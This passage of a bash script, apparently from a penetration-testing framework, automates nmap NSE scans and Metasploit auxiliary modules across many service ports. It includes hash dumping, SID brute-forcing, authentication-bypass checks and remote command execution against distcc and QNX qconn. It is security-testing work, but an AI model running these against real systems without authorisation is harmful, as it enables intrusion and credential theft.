     f_cleanup
     mv tmp4 $name/script-1050.txt
fi

if [[ -e $name/1080.txt ]]; then
     echo "     SOCKS"
     nmap -iL $name/1080.txt -Pn -n --open -p1080 --script-timeout 1m --script=socks-auth-info --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-1080.txt
fi

if [[ -e $name/1099.txt ]]; then
     echo "     RMI Registry"
     nmap -iL $name/1099.txt -Pn -n --open -p1099 --script-timeout 1m --script=rmi-dumpregistry --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-1099.txt
fi

if [[ -e $name/1344.txt ]]; then
     echo "     ICAP"
     nmap -iL $name/1344.txt -Pn -n --open -p1344 --script-timeout 1m --script=icap-info --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-1344.txt
fi

if [[ -e $name/1352.txt ]]; then
     echo "     Lotus Domino"
     nmap -iL $name/1352.txt -Pn -n --open -p1352 --script-timeout 1m --script=domino-enum-users --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-1352.txt
fi

if [[ -e $name/1433.txt ]]; then
     echo "     MS-SQL"
     nmap -iL $name/1433.txt -Pn -n --open -p1433 --script-timeout 1m --script=ms-sql-dump-hashes,ms-sql-empty-password,ms-sql-info,ms-sql-ntlm-info --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-1433.txt
fi

if [[ -e $name/1434.txt ]]; then
     echo "     MS-SQL UDP"
     nmap -iL $name/1434.txt -Pn -n -sU --open -p1434 --script-timeout 1m --script=ms-sql-dac --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-1434.txt
fi

if [[ -e $name/1521.txt ]]; then
     echo "     Oracle"
     nmap -iL $name/1521.txt -Pn -n --open -p1521 --script-timeout 1m --script=oracle-tns-version,oracle-sid-brute --script oracle-enum-users --script-args oracle-enum-users.sid=ORCL,userdb=orausers.txt --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-1521.txt
fi

if [[ -e $name/1604.txt ]]; then
     echo "     Citrix"
     nmap -iL $name/1604.txt -Pn -n -sU --open -p1604 --script-timeout 1m --script=citrix-enum-apps,citrix-enum-servers --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-1604.txt
fi

if [[ -e $name/1723.txt ]]; then
     echo "     PPTP"
     nmap -iL $name/1723.txt -Pn -n --open -p1723 --script-timeout 1m --script=pptp-version --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-1723.txt
fi

if [[ -e $name/1883.txt ]]; then
     echo "     MQTT"
     nmap -iL $name/1883.txt -Pn -n --open -p1883 --script-timeout 1m --script=mqtt-subscribe --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-1883.txt
fi

if [[ -e $name/1911.txt ]]; then
     echo "     Tridium Niagara Fox"
     nmap -iL $name/1911.txt -Pn -n --open -p1911 --script-timeout 1m --script=fox-info --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-1911.txt
fi

if [[ -e $name/1962.txt ]]; then
     echo "     PCWorx"
     nmap -iL $name/1962.txt -Pn -n --open -p1962 --script-timeout 1m --script=pcworx-info --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-1962.txt
fi

if [[ -e $name/2049.txt ]]; then
     echo "     NFS"
     nmap -iL $name/2049.txt -Pn -n --open -p2049 --script-timeout 1m --script=nfs-ls,nfs-showmount,nfs-statfs --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-2049.txt
fi

if [[ -e $name/2202.txt ]]; then
     echo "     ACARS"
     nmap -iL $name/2202.txt -Pn -n --open -p2202 --script-timeout 1m --script=acarsd-info --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-2202.txt
fi

if [[ -e $name/2302.txt ]]; then
     echo "     Freelancer"
     nmap -iL $name/2302.txt -Pn -n -sU --open -p2302 --script-timeout 1m --script=freelancer-info --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-2302.txt
fi

if [[ -e $name/2375.txt ]]; then
     echo "     Docker"
     nmap -iL $name/2375.txt -Pn -n --open -p2375 --script-timeout 1m --script=docker-version --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-2375.txt
fi

if [[ -e $name/2628.txt ]]; then
     echo "     DICT"
     nmap -iL $name/2628.txt -Pn -n --open -p2628 --script-timeout 1m --script=dict-info --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-2628.txt
fi

if [[ -e $name/2947.txt ]]; then
     echo "     GPS"
     nmap -iL $name/2947.txt -Pn -n --open -p2947 --script-timeout 1m --script=gpsd-info --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-2947.txt
fi

if [[ -e $name/3031.txt ]]; then
     echo "     Apple Remote Event"
     nmap -iL $name/3031.txt -Pn -n --open -p3031 --script-timeout 1m --script=eppc-enum-processes --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-3031.txt
fi

if [[ -e $name/3260.txt ]]; then
     echo "     iSCSI"
     nmap -iL $name/3260.txt -Pn -n --open -p3260 --script-timeout 1m --script=iscsi-info --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-3260.txt
fi

if [[ -e $name/3306.txt ]]; then
     echo "     MySQL"
     nmap -iL $name/3306.txt -Pn -n --open -p3306 --script-timeout 1m --script=mysql-databases,mysql-empty-password,mysql-info,mysql-users,mysql-variables --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-3306.txt
fi

if [[ -e $name/3310.txt ]]; then
     echo "     ClamAV"
     nmap -iL $name/3310.txt -Pn -n --open -p3310 --script-timeout 1m --script=clamav-exec --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 > $name/script-3310.txt
fi

if [[ -e $name/3389.txt ]]; then
     echo "     Remote Desktop"
     nmap -iL $name/3389.txt -Pn -n --open -p3389 --script-timeout 1m --script=rdp-vuln-ms12-020,rdp-enum-encryption --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     egrep -v '(attackers|Description|Disclosure|http|References|Risk factor)' tmp4 > $name/script-3389.txt
fi

if [[ -e $name/3478.txt ]]; then
     echo "     STUN"
     nmap -iL $name/3478.txt -Pn -n -sU --open -p3478 --script-timeout 1m --script=stun-version --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-3478.txt
fi

if [[ -e $name/3632.txt ]]; then
     echo "     Distributed Compiler Daemon"
     nmap -iL $name/3632.txt -Pn -n --open -p3632 --script-timeout 1m --script=distcc-cve2004-2687 --script-args="distcc-exec.cmd='id'" --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     egrep -v '(IDs|Risk factor|Description|Allows|earlier|Disclosure|Extra|References|http)' tmp4 > $name/script-3632.txt
fi

if [[ -e $name/3671.txt ]]; then
     echo "     KNX gateway"
     nmap -iL $name/3671.txt -Pn -n -sU --open -p3671 --script-timeout 1m --script=knx-gateway-info --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-3671.txt
fi

if [[ -e $name/4369.txt ]]; then
     echo "     Erlang Port Mapper"
     nmap -iL $name/4369.txt -Pn -n --open -p4369 --script-timeout 1m --script=epmd-info --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-4369.txt
fi

if [[ -e $name/5019.txt ]]; then
     echo "     Versant"
     nmap -iL $name/5019.txt -Pn -n --open -p5019 --script-timeout 1m --script=versant-info --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-5019.txt
fi

if [[ -e $name/5060.txt ]]; then
     echo "     SIP"
     nmap -iL $name/5060.txt -Pn -n --open -p5060 --script-timeout 1m --script=sip-enum-users,sip-methods --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-5060.txt
fi

if [[ -e $name/5353.txt ]]; then
     echo "     DNS Service Discovery"
     nmap -iL $name/5353.txt -Pn -n -sU --open -p5353 --script-timeout 1m --script=dns-service-discovery --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-5353.txt
fi

if [[ -e $name/5666.txt ]]; then
     echo "     Nagios"
     nmap -iL $name/5666.txt -Pn -n --open -p5666 --script-timeout 1m --script=nrpe-enum --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-5666.txt
fi

if [[ -e $name/5672.txt ]]; then
     echo "     AMQP"
     nmap -iL $name/5672.txt -Pn -n --open -p5672 --script-timeout 1m --script=amqp-info --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-5672.txt
fi

if [[ -e $name/5683.txt ]]; then
     echo "     CoAP"
     nmap -iL $name/5683.txt -Pn -n -sU --open -p5683 --script-timeout 1m --script=coap-resources --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-5683.txt
fi

if [[ -e $name/5850.txt ]]; then
     echo "     OpenLookup"
     nmap -iL $name/5850.txt -Pn -n --open -p5850 --script-timeout 1m --script=openlookup-info --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-5850.txt
fi

if [[ -e $name/5900.txt ]]; then
     echo "     VNC"
     nmap -iL $name/5900.txt -Pn -n --open -p5900 --script-timeout 1m --script=realvnc-auth-bypass,vnc-info,vnc-title --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-5900.txt
fi

if [[ -e $name/5984.txt ]]; then
     echo "     CouchDB"
     nmap -iL $name/5984.txt -Pn -n --open -p5984 --script-timeout 1m --script=couchdb-databases,couchdb-stats --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-5984.txt
fi

if [[ -e $name/x11.txt ]]; then
     echo "     X11"
     nmap -iL $name/x11.txt -Pn -n --open -p6000-6005 --script-timeout 1m --script=x11-access --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-x11.txt
fi

if [[ -e $name/6379.txt ]]; then
     echo "     Redis"
     nmap -iL $name/6379.txt -Pn -n --open -p6379 --script-timeout 1m --script=redis-info --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-6379.txt
fi

if [[ -e $name/6481.txt ]]; then
     echo "     Sun Service Tags"
     nmap -iL $name/6481.txt -Pn -n -sU --open -p6481 --script-timeout 1m --script=servicetags --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-6481.txt
fi

if [[ -e $name/6666.txt ]]; then
     echo "     Voldemort"
     nmap -iL $name/6666.txt -Pn -n --open -p6666 --script-timeout 1m --script=voldemort-info --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-6666.txt
fi

if [[ -e $name/7210.txt ]]; then
     echo "     Max DB"
     nmap -iL $name/7210.txt -Pn -n --open -p7210 --script-timeout 1m --script=maxdb-info --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-7210.txt
fi

if [[ -e $name/7634.txt ]]; then
     echo "     Hard Disk Info"
     nmap -iL $name/7634.txt -Pn -n --open -p7634 --script-timeout 1m --script=hddtemp-info --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-7634.txt
fi

if [[ -e $name/8000.txt ]]; then
     echo "     QNX QCONN"
     nmap -iL $name/8000.txt -Pn -n --open -p8000 --script-timeout 1m --script=qconn-exec --script-args=qconn-exec.timeout=60,qconn-exec.bytes=1024,qconn-exec.cmd="uname -a" --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-8000.txt
fi

if [[ -e $name/8009.txt ]]; then
     echo "     AJP"
     nmap -iL $name/8009.txt -Pn -n --open -p8009 --script-timeout 1m --script=ajp-methods,ajp-request --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-8009.txt
fi

if [[ -e $name/8081.txt ]]; then
     echo "     McAfee ePO"
     nmap -iL $name/8081.txt -Pn -n --open -p8081 --script-timeout 1m --script=mcafee-epo-agent --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-8081.txt
fi

if [[ -e $name/8091.txt ]]; then
     echo "     CouchBase Web Administration"
     nmap -iL $name/8091.txt -Pn -n --open -p8091 --script-timeout 1m --script=membase-http-info --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-8091.txt
fi

if [[ -e $name/8140.txt ]]; then
     echo "     Puppet"
     nmap -iL $name/8140.txt -Pn -n --open -p8140 --script-timeout 1m --script=puppet-naivesigning --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-8140.txt
fi

if [[ -e $name/bitcoin.txt ]]; then
     echo "     Bitcoin"
     nmap -iL $name/bitcoin.txt -Pn -n --open -p8332,8333 --script-timeout 1m --script=bitcoin-getaddr,bitcoin-info,bitcoinrpc-info --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-bitcoin.txt
fi

if [[ -e $name/9100.txt ]]; then
     echo "     Lexmark"
     nmap -iL $name/9100.txt -Pn -n --open -p9100 --script-timeout 1m --script=lexmark-config --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-9100.txt
fi

if [[ -e $name/9160.txt ]]; then
     echo "     Cassandra"
     nmap -iL $name/9160.txt -Pn -n --open -p9160 --script-timeout 1m --script=cassandra-info --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-9160.txt
fi

if [[ -e $name/9600.txt ]]; then
     echo "     FINS"
     nmap -iL $name/9600.txt -Pn -n --open -p9600 --script-timeout 1m --script=omron-info --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-9600.txt
fi

if [[ -e $name/9999.txt ]]; then
     echo "     Java Debug Wire Protocol"
     nmap -iL $name/9999.txt -Pn -n --open -p9999 --script-timeout 1m --script=jdwp-version --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-9999.txt
fi

if [[ -e $name/10000.txt ]]; then
     echo "     Network Data Management"
     nmap -iL $name/10000.txt -Pn -n --open -p10000 --script-timeout 1m --script=ndmp-fs-info,ndmp-version --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-10000.txt
fi

if [[ -e $name/11211.txt ]]; then
     echo "     Memory Object Caching"
     nmap -iL $name/11211.txt -Pn -n --open -p11211 --script-timeout 1m --script=memcached-info --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-11211.txt
fi

if [[ -e $name/12000.txt ]]; then
     echo "     CCcam"
     nmap -iL $name/12000.txt -Pn -n --open -p12000 --script-timeout 1m --script=cccam-version --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-12000.txt
fi

if [[ -e $name/12345.txt ]]; then
     echo "     NetBus"
     nmap -iL $name/12345.txt -Pn -n --open -p12345 --script-timeout 1m --script=netbus-auth-bypass,netbus-version --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-12345.txt
fi

if [[ -e $name/17185.txt ]]; then
     echo "     VxWorks"
     nmap -iL $name/17185.txt -Pn -n -sU --open -p17185 --script-timeout 1m --script=wdb-version --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-17185.txt
fi

if [[ -e $name/19150.txt ]]; then
     echo "     GKRellM"
     nmap -iL $name/19150.txt -Pn -n --open -p19150 --script-timeout 1m --script=gkrellm-info --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-19150.txt
fi

if [[ -e $name/27017.txt ]]; then
     echo "     MongoDB"
     nmap -iL $name/27017.txt -Pn -n --open -p27017 --script-timeout 1m --script=mongodb-databases,mongodb-info --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-27017.txt
fi

if [[ -e $name/31337.txt ]]; then
     echo "     BackOrifice"
     nmap -iL $name/31337.txt -Pn -n -sU --open -p31337 --script-timeout 1m --script=backorifice-info --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-31337.txt
fi

if [[ -e $name/35871.txt ]]; then
     echo "     Flume"
     nmap -iL $name/35871.txt -Pn -n --open -p35871 --script-timeout 1m --script=flume-master-info --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-35871.txt
fi

if [[ -e $name/44818.txt ]]; then
     echo "     EtherNet/IP"
     nmap -iL $name/44818.txt -Pn -n -sU --open -p44818 --script-timeout 1m --script=enip-info --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-44818.txt
fi

if [[ -e $name/47808.txt ]]; then
     echo "     BACNet"
     nmap -iL $name/47808.txt -Pn -n -sU --open -p47808 --script-timeout 1m --script=bacnet-info --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-47808.txt
fi

if [[ -e $name/49152.txt ]]; then
     echo "     Supermicro"
     nmap -iL $name/49152.txt -Pn -n --open -p49152 --script-timeout 1m --script=supermicro-ipmi-conf --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-49152.txt
fi

if [[ -e $name/50000.txt ]]; then
     echo "     DRDA"
     nmap -iL $name/50000.txt -Pn -n --open -p50000 --script-timeout 1m --script=drda-info --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-50000.txt
fi

if [[ -e $name/hadoop.txt ]]; then
     echo "     Hadoop"
     nmap -iL $name/hadoop.txt -Pn -n --open -p50030,50060,50070,50075,50090 --script-timeout 1m --script=hadoop-datanode-info,hadoop-jobtracker-info,hadoop-namenode-info,hadoop-secondary-namenode-info,hadoop-tasktracker-info --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-hadoop.txt
fi

if [[ -e $name/apache-hbase.txt ]]; then
     echo "     Apache HBase"
     nmap -iL $name/apache-hbase.txt -Pn -n --open -p60010,60030 --script-timeout 1m --script=hbase-master-info,hbase-region-info --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-apache-hbase.txt
fi

rm tmp*

for x in $name/./script*; do
     if grep '|' $x > /dev/null 2>&1; then
          echo > /dev/null 2>&1
     else
          rm $x > /dev/null 2>&1
     fi
done

##############################################################################################################

# Additional tools

if [[ -e $name/161.txt ]]; then
     onesixtyone -c /usr/share/doc/onesixtyone/dict.txt -i $name/161.txt > $name/onesixtyone.txt
fi

if [ -e $name/445.txt ] || [ -e $name/500.txt ]; then
     echo
     echo $medium
     echo
     echo -e "\x1B[1;34mRunning additional tools.\x1B[0m"
fi

if [[ -e $name/445.txt ]]; then
     echo "     enum4linux"
     for i in $(cat $name/445.txt); do
          enum4linux -a $i | egrep -v "(Can't determine|enum4linux|Looking up status|No printers|No reply from|unknown|[E])" > tmp
          cat -s tmp >> $name/script-enum4linux.txt
     done
fi

if [[ -e $name/445.txt ]]; then
     echo "     smbclient"
     for i in $(cat $name/445.txt); do
          echo $i >> $name/script-smbclient.txt
          smbclient -L $i -N | grep -v 'failed' >> $name/script-smbclient.txt 2>/dev/null
          echo >> $name/script-smbclient.txt
     done
fi

if [[ -e $name/500.txt ]]; then
     echo "     ike-scan"
     for i in $(cat $name/445.txt); do
          ike-scan -f $i >> $name/script-ike-scan.txt
     done
fi

rm tmp 2>/dev/null
}

##############################################################################################################

f_metasploit(){
echo
echo $medium
echo
echo -ne "\x1B[1;33mRun matching Metasploit auxiliaries? (y/N) \x1B[0m"
read msf

if [ "$msf" == "y" ]; then
     f_run-metasploit
else
     f_report
fi
}

##############################################################################################################

f_run-metasploit(){
echo
echo -e "\x1B[1;34mStarting Postgres.\x1B[0m"
service postgresql start

echo
echo -e "\x1B[1;34mStarting Metasploit.\x1B[0m"
echo
echo -e "\x1B[1;34mUsing the following resource files.\x1B[0m"
cp -R $discover/resource/ /tmp/

echo workspace -a $name > /tmp/master
echo spool tmpmsf > /tmp/master

if [[ -e $name/19.txt ]]; then
     echo "     Chargen Probe Utility"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$discover\/$name\/19.txt|g" /tmp/resource/19-chargen.rc
     cat /tmp/resource/19-chargen.rc >> /tmp/master
fi

if [[ -e $name/21.txt ]]; then
     echo "     FTP"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/21.txt|g" /tmp/resource/21-ftp.rc
     cat /tmp/resource/21-ftp.rc >> /tmp/master
fi

if [[ -e $name/22.txt ]]; then
     echo "     SSH"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/22.txt|g" /tmp/resource/22-ssh.rc
     cat /tmp/resource/22-ssh.rc >> /tmp/master
fi

if [[ -e $name/23.txt ]]; then
     echo "     Telnet"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/23.txt|g" /tmp/resource/23-telnet.rc
     cat /tmp/resource/23-telnet.rc >> /tmp/master
fi

if [[ -e $name/25.txt ]]; then
     echo "     SMTP"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/25.txt|g" /tmp/resource/25-smtp.rc
     cat /tmp/resource/25-smtp.rc >> /tmp/master
fi

if [[ -e $name/69.txt ]]; then
     echo "     TFTP"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/69.txt|g" /tmp/resource/69-tftp.rc
     cat /tmp/resource/69-tftp.rc >> /tmp/master
fi

if [[ -e $name/79.txt ]]; then
     echo "     Finger"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/79.txt|g" /tmp/resource/79-finger.rc
     cat /tmp/resource/79-finger.rc >> /tmp/master
fi

if [[ -e $name/110.txt ]]; then
     echo "     POP3"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/110.txt|g" /tmp/resource/110-pop3.rc
     cat /tmp/resource/110-pop3.rc >> /tmp/master
fi

if [[ -e $name/111.txt ]]; then
     echo "     RPC"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/111.txt|g" /tmp/resource/111-rpc.rc
     cat /tmp/resource/111-rpc.rc >> /tmp/master
fi

if [[ -e $name/123.txt ]]; then
     echo "     NTP"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/123.txt|g" /tmp/resource/123-udp-ntp.rc
     cat /tmp/resource/123-udp-ntp.rc >> /tmp/master
fi

if [[ -e $name/135.txt ]]; then
     echo "     DCE/RPC"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/135.txt|g" /tmp/resource/135-dcerpc.rc
     cat /tmp/resource/135-dcerpc.rc >> /tmp/master
fi

if [[ -e $name/137.txt ]]; then
     echo "     NetBIOS"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/137.txt|g" /tmp/resource/137-udp-netbios.rc
     cat /tmp/resource/137-udp-netbios.rc >> /tmp/master
fi

if [[ -e $name/143.txt ]]; then
     echo "     IMAP"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/143.txt|g" /tmp/resource/143-imap.rc
     cat /tmp/resource/143-imap.rc >> /tmp/master
fi

if [[ -e $name/161.txt ]]; then
     echo "     SNMP"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/161.txt|g" /tmp/resource/161-udp-snmp.rc
     cat /tmp/resource/161-udp-snmp.rc >> /tmp/master
fi

if [[ -e $name/407.txt ]]; then
     echo "     Motorola"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/407.txt|g" /tmp/resource/407-udp-motorola.rc
     cat /tmp/resource/407-udp-motorola.rc >> /tmp/master
fi

if [[ -e $name/443.txt ]]; then
     echo "     VMware"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/443.txt|g" /tmp/resource/443-vmware.rc
     cat /tmp/resource/443-vmware.rc >> /tmp/master
fi

if [[ -e $name/445.txt ]]; then
     echo "     SMB"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/445.txt|g" /tmp/resource/445-smb.rc
     cat /tmp/resource/445-smb.rc >> /tmp/master
fi

if [[ -e $name/465.txt ]]; then
     echo "     SMTP/S"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/465.txt|g" /tmp/resource/465-smtp.rc
     cat /tmp/resource/465-smtp.rc >> /tmp/master
fi

if [[ -e $name/502.txt ]]; then
     echo "     SCADA Modbus Client Utility"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/502.txt|g" /tmp/resource/502-scada.rc
     cat /tmp/resource/502-scada.rc >> /tmp/master
fi

if [[ -e $name/512.txt ]]; then
     echo "     Rexec"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/512.txt|g" /tmp/resource/512-rexec.rc
     cat /tmp/resource/512-rexec.rc >> /tmp/master
fi

if [[ -e $name/513.txt ]]; then
     echo "     rlogin"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/513.txt|g" /tmp/resource/513-rlogin.rc
     cat /tmp/resource/513-rlogin.rc >> /tmp/master
fi

if [[ -e $name/514.txt ]]; then
     echo "     rshell"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/514.txt|g" /tmp/resource/514-rshell.rc
     cat /tmp/resource/514-rshell.rc >> /tmp/master
fi

if [[ -e $name/523.txt ]]; then
     echo "     db2"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/523.txt|g" /tmp/resource/523-udp-db2.rc
     cat /tmp/resource/523-udp-db2.rc >> /tmp/master
fi

if [[ -e $name/548.txt ]]; then
     echo "     AFP"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/548.txt|g" /tmp/resource/548-afp.rc
     cat /tmp/resource/548-afp.rc >> /tmp/master
fi

if [[ -e $name/623.txt ]]; then
     echo "     IPMI"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/623.txt|g" /tmp/resource/623-udp-ipmi.rc
     cat /tmp/resource/623-udp-ipmi.rc >> /tmp/master
fi

if [[ -e $name/771.txt ]]; then
     echo "     SCADA Digi"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/771.txt|g" /tmp/resource/771-scada.rc
     cat /tmp/resource/771-scada.rc >> /tmp/master
fi

if [[ -e $name/831.txt ]]; then
     echo "     EasyCafe Server Remote File Access"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/831.txt|g" /tmp/resource/831-easycafe.rc
     cat /tmp/resource/831-easycafe.rc >> /tmp/master
fi

if [[ -e $name/902.txt ]]; then
     echo "     VMware"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/902.txt|g" /tmp/resource/902-vmware.rc
     cat /tmp/resource/902-vmware.rc >> /tmp/master
fi

if [[ -e $name/998.txt ]]; then
     echo "     Novell ZENworks Configuration Management Preboot Service Remote File Access"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/998.txt|g" /tmp/resource/998-zenworks.rc
     cat /tmp/resource/998-zenworks.rc >> /tmp/master
fi

if [[ -e $name/1099.txt ]]; then
     echo "     RMI Registery"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/1099.txt|g" /tmp/resource/1099-rmi.rc
     cat /tmp/resource/1099-rmi.rc >> /tmp/master
fi

if [[ -e $name/1158.txt ]]; then
     echo "     Oracle"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/1158.txt|g" /tmp/resource/1158-oracle.rc
     cat /tmp/resource/1158-oracle.rc >> /tmp/master
fi

if [[ -e $name/1433.txt ]]; then
     echo "     MS-SQL"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/1433.txt|g" /tmp/resource/1433-mssql.rc
     cat /tmp/resource/1433-mssql.rc >> /tmp/master
fi

if [[ -e $name/1521.txt ]]; then
     echo "     Oracle"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/1521.txt|g" /tmp/resource/1521-oracle.rc
     cat /tmp/resource/1521-oracle.rc >> /tmp/master
fi

if [[ -e $name/1604.txt ]]; then
     echo "     Citrix"
